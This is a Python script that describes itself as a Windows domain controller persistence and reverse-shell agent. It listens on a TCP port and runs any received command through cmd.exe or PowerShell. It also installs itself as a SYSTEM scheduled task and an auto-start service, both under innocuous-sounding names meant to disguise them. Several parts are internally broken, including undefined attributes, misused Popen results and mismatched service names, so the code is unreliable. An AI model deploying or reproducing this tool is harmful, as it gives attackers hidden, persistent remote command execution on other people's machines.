#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows Domain Controller Persistence & Reverse Shell Agent (Service + Self-Repair Mode)
FEATURES:
 1. Reverse TCP listener (Port 4444 default)
 2. Pipes input to cmd.exe or PowerShell
 3. Smart Prompt: user@hostname - folderpath >
 4. Windows Service Mode: Installable as SYSTEM service
 5. Self-Repair: Restarts shell if it dies
 6. Lifecycle Manager: Keeps listener alive after shell closure
"""

import socket
import threading
import sys
import os
import argparse
import time
import datetime
import subprocess
from subprocess import Popen, PIPE
from ctypes import windll, wintypes

# === CONFIGURATION ===
LISTENER_HOST = "0.0.0.0"
DEFAULT_PORT = 4444
DEFAULT_TASK_NAME = "Network Manager Cleanup"
DEFAULT_TASK_RUN_AS = "SYSTEM"
DEFAULT_TASK_TRIGGER = "ONSTART"

# === SERVICE MODE ===
SERVICE_NAME = "Network Server"
SERVICE_DISPLAY_NAME = "Network Server Service"
SERVICE_DESCRIPTION = "Windows Service with Self-Repair for Network Connections"
SERVICE_START_TYPE = 4  # SERVICE_AUTO_START
SERVICE_ERROR_CONTROL = 3  # SERVICE_ERROR_NORMAL
SERVICE_PATH = sys.argv[0]

# === PROMPT CONFIGURATION ===
PROMPT_TEMPLATE = "{user}@{hostname} - {folder}>"

# === SERVICE CLASS ===
class WindowsService:
    """Windows Service wrapper for DC Payload."""
    
    def __init__(self, service_name, display_name, description, path, args):
        self.service_name = service_name
        self.display_name = display_name
        self.description = description
        self.path = path
        self.args = args
        self.running = True
        self.main_thread = None
        self.service_thread = None
        
    def install(self):
        """Install as Windows Service."""
        print("=" * 40)
        print("INSTALLING WINDOWS SERVICE")
        print("=" * 40)
        
        try:
            # Create service
            cmd = f'sc create {self.service_name} binPath="{os.path.join(os.path.dirname(self.path), os.path.basename(self.path))} --mode service --install --auto --path {self.path} {self.args}" start=auto'
            print(f"[*] Running: {cmd}")
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] Service installed: {self.service_name}")
                print(f"[+] Display Name: {self.display_name}")
                print(f"[+] Start Type: AUTO")
                print("[*] Run 'sc start DC_Persistence_Service' to start")
                print("[*] Run 'sc stop DC_Persistence_Service' to stop")
                print("[*] Run 'sc qc DC_Persistence_Service' to query")
                return True
            else:
                print(f"[!] Error: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"[!] Exception: {e}")
            return False
    
    def uninstall(self):
        """Uninstall Windows Service."""
        print("=" * 40)
        print("UNINSTALLING WINDOWS SERVICE")
        print("=" * 40)
        
        try:
            cmd = f'sc delete {self.service_name}'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Service deleted: {self.service_name}")
                return True
            else:
                print(f"[!] Error: {result.stderr}")
                return False
        except Exception as e:
            print(f"[!] Exception: {e}")
            return False
    
    def start(self):
        """Start Windows Service."""
        print("=" * 40)
        print("STARTING WINDOWS SERVICE")
        print("=" * 40)
        
        try:
            cmd = f'start {self.service_name}'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Service started: {self.service_name}")
                return True
            else:
                print(f"[!] Error: {result.stderr}")
                return False
        except Exception as e:
            print(f"[!] Exception: {e}")
            return False
    
    def stop(self):
        """Stop Windows Service."""
        print("=" * 40)
        print("STOPPING WINDOWS SERVICE")
        print("=" * 40)
        
        try:
            cmd = f'sc stop {self.service_name}'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Service stopped: {self.service_name}")
                return True
            else:
                print(f"[!] Error: {result.stderr}")
                return False
        except Exception as e:
            print(f"[!] Exception: {e}")
            return False
    
    def run_loop(self):
        """Main service loop after startup."""
        print("[*] Service started successfully")
        print("[*] Starting main listener loop")
        
        # Start listener thread
        self.main_thread = threading.Thread(target=self.main_listener)
        self.main_thread.daemon = True
        self.main_thread.start()
        
        # Keep service running
        while self.running:
            time.sleep(1)
    
    def main_listener(self):
        """Main listener thread."""
        self.create_listener()
    
    def create_listener(self):
        """Create TCP listener."""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        print(f"[+] Listener Started on {self.host}:{self.port}")
        print(f"[+] Mode: {self.command_type}")
        print(f"[+] Waiting for connection...")
        
        while self.running:
            try:
                client_sock, addr = self.socket.accept()
                print(f"[*] Connected: {addr}")
                threading.Thread(target=self.process_connection, args=(client_sock, addr)).start()
            except Exception as e:
                print(f"Error accepting connection: {e}")
                time.sleep(1)
                continue
    
    def process_connection(self, client_sock, addr):
        """Process single connection."""
        try:
            while True:
                msg = client_sock.recv(4096).decode('utf-8').strip()
                if not msg:
                    break
                clean_cmd = msg.strip('"\'')
                output = self.execute_shell(clean_cmd)
                client_sock.sendall(output.encode('utf-8'))
        except Exception as e:
            print(f"[!] Error reading from {addr}: {e}")
        finally:
            try:
                client_sock.close()
            except:
                pass

# === SHELL MANAGER ===
class ShellManager:
    """Manages shell process (cmd/Powershell) with health check."""
    
    def __init__(self, socket_handler):
        self.socket_handler = socket_handler
        self.shell_process = None
        self.running = True
        
    def start_shell(self, mode):
        """Start shell process."""
        executable = "powershell.exe" if mode == "powershell" else "cmd.exe"
        self.shell_process = Popen(executable + " /c ", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True)
        print("[*] Shell process started")
        
    def monitor_shell(self):
        """Monitor shell health and restart if dead."""
        try:
            # Simple heartbeat check
            proc = Popen('echo', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True)
            proc.communicate()
            return proc.returncode == 0
        except:
            return False
    
    def get_shell_status(self):
        """Get current shell status."""
        if self.shell_process and self.shell_process.poll() is None:
            return "Running"
        return "Stopped"
    
    def restart_shell(self):
        """Restart shell if dead."""
        if self.shell_process:
            print("[*] Restarting shell process. ..")
            self.shell_process.terminate()
            self.shell_process = Popen("echo", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True)
            return True
        return False

# === PERSISTENCE MANAGER (Fixed) ===
class PersistenceManager:
    @staticmethod
    def create_task(script_path, task_name, run_as="SYSTEM", trigger="ONSTART"):
        print(f"[*] Configuring Persistence via Task Scheduler. ..")

        schtasks_paths = [
            "schtasks.exe",
            os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32", "schtasks.exe"),
            os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "schtasks.exe"),
        ]

        schtasks_exe = None
        for path in schtasks_paths:
            if os.path.exists(path):
                schtasks_exe = path
                print(f"[+] Found schtasks at: {path}")
                break
        else:
            print("[!] Warning: schtasks.exe not found in default paths")
            return

        # === FIXED: Build command based on trigger ===
        if trigger in ["ONSTART", "ONLOGON", "ONIDLE", "ONEVENT"]:
            command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC {trigger} /F'
        else:
            command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC ONSTART /ST 00:00 /F'

        try:
            print(f"[*] Running Command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                print(f"[+] Task Created/Updated: {task_name}")
                print(f"[+] Running As: {run_as}")
                print(f"[+] Trigger: {trigger}")
            else:
                print(f"[!] Error creating task. Output: {result.stderr}")
        except subprocess.TimeoutExpired:
            print("[!] Task creation timed out (max 30 seconds)")
        except Exception as e:
            print(f"[!] Exception while creating task: {e}")

    @staticmethod
    def delete_task(task_name):
        """Delete scheduled task."""
        try:
            schtasks_exe = "schtasks.exe"
            if not os.path.exists(schtasks_exe):
                schtasks_exe = os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32", "schtasks.exe")
            command = f'{schtasks_exe} /Delete /TN "{task_name}" /F'
            print(f"[*] Running Command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                print(f"[+] Task deleted: {task_name}")
            else:
                print(f"[!] Error deleting task. Output: {result.stderr}")
        except Exception as e:
            print(f"[!] Exception: {e}")

# === SHELL PROMPT (Smart Detection) ===
class ShellPromptManager:
    @staticmethod
    def get_prompt_info(shell_type):
        """Get user, hostname, and folder from shell."""
        try:
            if shell_type == "powershell":
                user_out, _ = Popen('powershell.exe -c "$env:USERNAME; $env:COMPUTERNAME; Get-Location"', shell=True, stdout=PIPE, stderr=PIPE, text=True)
            else:
                user_out, _ = Popen('cmd.exe /c "echo %USERNAME%; echo %COMPUTERNAME%; cd"', shell=True, stdout=PIPE, stderr=PIPE, text=True)
            
            lines = user_out.stdout.strip().splitlines()
            if len(lines) >= 3:
                return lines[0], lines[1], lines[2]  # user, hostname, folder
            return ["User", "Hostname", "root"]
        except:
            return ["User", "Hostname", "root"]

    @staticmethod
    def create_prompt(user, hostname, folder):
        """Create formatted prompt."""
        try:
            return PROMPT_TEMPLATE.format(user=user, hostname=hostname, folder=folder)
        except:
            return "User@Hostname - root>"

# === MAIN ENTRY POINT ===
def get_script_path():
    return os.path.abspath(sys.argv[0])

def main():
    parser = argparse.ArgumentParser(description="Windows Reverse Shell Agent")
    parser.add_argument('--mode', type=str, default='cmd', choices=['cmd', 'powershell'], help='Shell mode (Default: cmd)')
    parser.add_argument('--port', type=int, default=DEFAULT_PORT, help='Listening port (Default: 4444)')
    parser.add_argument('--install', action='store_true', help='Install as Windows Service')
    parser.add_argument('--service', action='store_true', help='Run as Windows Service')
    parser.add_argument('--install-persistence', action='store_true', help='Install Task Scheduler persistence')
    parser.add_argument('--path', type=str, default=".", help='Script path')
    args = parser.parse_args()

    print("=" * 40)
    print("WINDOWS REVERSE SHELL AGENT")
    print("=" * 40)

    script_path = get_script_path()
    print(f"[*] Script Executing From: {script_path}")

    # === 1. Setup Socket Listener ===
    class MainListener:
        def __init__(self, host, port, command_type):
            self.host = host
            self.port = port
            self.command_type = command_type
            self.socket = None

        def start(self):
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            print(f"[+] Listener Started on {self.host}:{self.port}")
            print(f"[+] Mode: {self.command_type}")
            print(f"[+] Waiting for connection. ..")

            while True:
                try:
                    client_sock, addr = self.socket.accept()
                    print(f"[*] Connected: {addr}")
                    threading.Thread(target=self.process_connection, args=(client_sock, addr)).start()
                except Exception as e:
                    print(f"Error accepting connection: {e}")
                    time.sleep(1)
                    continue

        def process_connection(self, client_sock, addr):
            try:
                while True:
                    msg = client_sock.recv(4096).decode('utf-8').strip()
                    if not msg:
                        break
                    clean_cmd = msg.strip('"\'')
                    output = self.execute_shell(clean_cmd)
                    client_sock.sendall(output.encode('utf-8'))
            except Exception as e:
                print(f"[!] Error reading from {addr}: {e}")
            finally:
                try:
                    client_sock.close()
                except:
                    pass

        def execute_shell(self, cmd):
            if not cmd:
                return self._get_shell_prompt()

            executable = "powershell.exe" if self.command_type == "powershell" else "cmd.exe"
            shell_cmd = executable + " /c " + cmd

            try:
                proc = Popen(shell_cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True)

                output = ""
                try:
                    if proc.stdout:
                        output = proc.stdout.read()
                    if proc.stderr:
                        err = proc.stderr.read()
                        if err:
                            output = output + "\n[Error]: " + err
                except:
                    pass

                exit_code = proc.returncode
                proc.wait()

                # === SMART PROMPT INJECTION ===
                try:
                    user, hostname, folder = ShellPromptManager.get_prompt_info(self.command_type)
                    prompt = PROMPT_TEMPLATE.format(user=user, hostname=hostname, folder=folder)
                    if output:
                        output = output.rstrip() + "\n\n" + prompt
                    else:
                        output = prompt
                except:
                    output = ShellPromptManager.create_prompt("User", "Hostname", "root")

                return f"exit_code:{exit_code}\n{output}"
            except Exception as e:
                return f"Exception: {e}"

        def _get_shell_prompt(self):
            """Get shell prompt info."""
            try:
                user, hostname, folder = ShellPromptManager.get_prompt_info(self.command_type)
                return ShellPromptManager.create_prompt(user, hostname, folder)
            except:
                return "User@Hostname - root>"

    # === 2. Setup Persistence (Create Task) ===
    if args.install or args.install_persistence:
        PersistenceManager.create_task(script_path, DEFAULT_TASK_NAME, DEFAULT_TASK_RUN_AS, DEFAULT_TASK_TRIGGER)
        time.sleep(2)

    # === 3. Windows Service Installation ===
    if args.install:
        print("=" * 40)
        print("INSTANTIATING WINDOWS SERVICE")
        print("=" * 40)
        
        service = WindowsService(SERVICE_NAME, SERVICE_DISPLAY_NAME, SERVICE_DESCRIPTION, script_path, f"--port {DEFAULT_PORT} --mode {args.mode}")
        if service.install():
            print("[*] Press any key to start service, or Ctrl+C to exit")
            try:
                input()
                service.start()
                service.run_loop()
            except KeyboardInterrupt:
                print("[*] Service stopped")
                service.stop()
        else:
            print("[*] Press any key to run in interactive mode")
            input()

    # === 4. Run as Service (if flag set) ===
    if args.service:
        print("[*] Running as Windows Service. . .")
        try:
            service = WindowsService(SERVICE_NAME, SERVICE_DISPLAY_NAME, SERVICE_DESCRIPTION, script_path, f"--port {DEFAULT_PORT} --mode {args.mode}")
            if service.install():
                service.run_loop()
        except Exception as e:
            print(f"[!] Error: {e}")

    # === 5. Interactive Mode (Default) ===
    listener = MainListener(LISTENER_HOST, args.port, args.mode)
    listener_thread = threading.Thread(target=listener.start)
    listener_thread.daemon = True
    listener_thread.start()

    print("[+] Agent Initialized.")
    print("[+] Main thread will keep running to monitor exit codes.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Graceful Shutdown. ..")
        listener.socket.close()

if __name__ == "__main__":
    main()
